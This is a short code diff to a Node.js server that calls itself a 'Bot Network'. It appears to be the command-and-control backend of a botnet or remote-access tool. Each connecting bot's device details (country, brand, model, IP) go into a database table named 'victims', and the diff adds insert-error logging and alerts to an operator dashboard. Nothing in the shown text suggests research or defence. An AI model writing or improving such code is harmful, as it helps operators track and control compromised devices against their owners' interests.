@@ -102,7 +102,8 @@ console.log(`Bot Network listening on http://${ipB}:${portB}/`)
 
 botIo.on("connection", async (socket) => {
     var data = JSON.parse(socket.handshake.query.info)
-    await superBase.from("victims")
+
+    const { error: insertError } = await superBase.from("victims")
         .insert([{
             "ID": socket.id,
             "Country": data.Country,
@@ -113,7 +114,19 @@ botIo.on("connection", async (socket) => {
             "Manufacture": data.Manufacture
         }])
 
+    if (insertError) {
+        console.error("Database Insert Error:", insertError); // DEBUG
+    } else {
+        console.log("Database Insert Success"); // DEBUG
+    }
+
     console.log(chalk.green(`[+] Bot Connected (${socket.id}) => ${socket.request.connection.remoteAddress}:${socket.request.connection.remotePort}`))
+
+    // Notify Dashboard
+    if (adminSoc != null) {
+        adminSoc.emit("logger", `[+] New Connection: ${data.Brand} ${data.Model} (${data.IP})`)
+    }
+
     getRemaining()
 
 
